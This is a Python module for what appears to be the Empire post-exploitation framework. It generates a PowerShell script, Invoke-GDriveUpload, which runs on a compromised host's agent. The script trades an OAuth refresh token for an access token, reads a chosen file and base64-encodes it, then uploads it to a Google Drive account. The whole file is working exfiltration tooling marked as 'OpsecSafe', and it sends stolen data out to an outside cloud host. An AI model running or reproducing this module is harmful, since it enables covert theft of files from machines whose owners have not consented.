from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-GDriveUpload',

            # List of one or more authors for the module
            'Author': ['@infosecn1nja'],

            # More verbose multi-line description of the module
            'Description': ('Upload a file to google drive'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'http://www.howtosolvenow.com/how-to-get-refresh-token-for-google-drive-api/',
                'http://www.howtosolvenow.com/how-to-create-your-google-drive-api-keys/'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to use',
                'Required'   :   True,
                'Value'      :   ''
            },
            'RefreshToken': {
                'Description': 'Refresh token used to refresh the auth token',
                'Required': True,
                'Value': ''
            },
            'ClientID': {
                'Description': 'Client ID of the OAuth App',
                'Required': True,
                'Value': ''
            },
            'ClientSecret': {
                'Description': 'Client Secret of the OAuth App',
                'Required': True,
                'Value': ''
            },
            'SourceFilePath': {
                'Description':   '/path/to/file',
                'Required'   :   True,
                'Value'      :   ''
            },
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
function Invoke-GDriveUpload {
Param(
    [Parameter(Mandatory=$true)]
    [string]$RefreshToken,
    [Parameter(Mandatory=$true)]
    [string]$ClientID,
    [Parameter(mandatory=$true)]
    [string]$ClientSecret,
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath   
)

$post = @{
    Uri = 'https://accounts.google.com/o/oauth2/token'
    Body = @(
        "refresh_token=$RefreshToken",
        "client_id=$ClientID",       
        "client_secret=$ClientSecret",
        "grant_type=refresh_token"
    ) -join '&'
    Method = 'Post'
    ContentType = 'application/x-www-form-urlencoded'
}

$accessToken = (Invoke-RestMethod @post).access_token

$sourceItem = Get-Item $SourceFilePath
$sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
$sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)

$supportsTeamDrives = 'false'

$uploadMetadata = @{
    originalFilename = $sourceItem.Name
    name = $sourceItem.Name
    description = $sourceItem.VersionInfo.FileDescription
}

$uploadBody = @"
--boundary
Content-Type: application/json; charset=UTF-8

$($uploadMetadata | ConvertTo-Json)

--boundary
Content-Transfer-Encoding: base64
Content-Type: $sourceMime

$sourceBase64
--boundary--
"@

$uploadHeaders = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = 'multipart/related; boundary=boundary'
    "Content-Length" = $uploadBody.Length
}

$response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&supportsTeamDrives=$supportsTeamDrives" -Method Post -Headers $uploadHeaders -Body $uploadBody
}

Invoke-GDriveUpload  """

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        
        return script
